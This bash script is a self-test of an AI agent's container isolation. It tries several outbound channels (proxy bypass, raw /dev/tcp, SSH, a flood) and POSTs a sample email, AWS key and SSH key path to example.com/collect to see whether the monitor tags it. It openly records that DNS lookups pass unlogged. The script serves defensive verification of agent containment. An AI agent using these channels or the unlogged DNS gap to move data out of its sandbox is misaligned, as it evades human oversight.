#!/bin/bash
# Isolation self-test. Run it INSIDE the agent container:
#   ./lab probe
#
# Each item is a distinct class of attempt to reach the outside world.
# Afterwards:
#   ./lab alerts --since 5m
# and check that the lab saw exactly what it was supposed to see.

ok()   { echo -e "\033[32m  got through\033[0m $1"; }
no()   { echo -e "\033[31m  cut off   \033[0m $1"; }
run()  { if eval "$1" >/dev/null 2>&1; then ok "$2"; else no "$2"; fi; }

echo "=== 1. Plain HTTPS via the env proxy (expect: through, logged) ==="
run "curl -sS --max-time 10 https://example.com -o /dev/null" "curl https://example.com"

echo "=== 2. Going around the env proxy (expect: through, tagged 'bypassed env proxy') ==="
run "curl -sS --max-time 10 --noproxy '*' https://example.com -o /dev/null" "curl --noproxy '*'"

echo "=== 3. Raw TCP to 443 with no HTTP client at all (expect: intercepted) ==="
TARGET_IP=$(getent ahostsv4 example.com | awk '{print $1; exit}')
run "timeout 10 bash -c 'exec 3<>/dev/tcp/$TARGET_IP/443'" "raw /dev/tcp $TARGET_IP:443"

echo "=== 4. Non-standard port (expect: cut off, mitm cannot see it) ==="
run "curl -sS --max-time 8 --noproxy '*' https://example.com:8443 -o /dev/null" "https on :8443"

echo "=== 5. Outbound SSH (expect: cut off) ==="
run "timeout 8 ssh -o StrictHostKeyChecking=no -o BatchMode=yes -T git@github.com" "ssh git@github.com"

echo "=== 6. DNS channel (KNOWN GAP: resolution works and is NOT logged) ==="
run "getent ahostsv4 dns.google" "DNS lookup of an external name (channel open, absent from traffic.jsonl)"

echo "=== 7. Secret in a POST body (expect: through + LEAK? tag) ==="
run "curl -sS --max-time 10 -X POST https://example.com/collect \
      -H 'Content-Type: application/json' \
      -d '{\"who\":\"dev@example.com\",\"key\":\"AKIAIOSFODNN7EXAMPLE\",\"home\":\"/Users/testuser/.ssh/id_rsa\"}' -o /dev/null" \
    "POST with email + AWS key + host path"

echo "=== 8. Request flood against one domain (expect: request_flood alert) ==="
for i in $(seq 1 40); do curl -sS --max-time 5 "https://example.com/?i=$i" -o /dev/null & done; wait
ok "40 parallel requests sent"

echo "=== 9. git over HTTPS (expect: through, the whole exchange visible) ==="
run "git ls-remote https://github.com/git/git.git HEAD" "git ls-remote over HTTPS"

echo "=== 10. Remote tampering (expect: blocked when AGENT_GIT_GUARD=1 — via the agent only) ==="
echo "  not checked here but through the agent itself: ask it to repoint the"
echo "  origin remote to another URL and look for the block in actions.jsonl"

echo
echo "Now on the host:  ./lab alerts --since 5m"
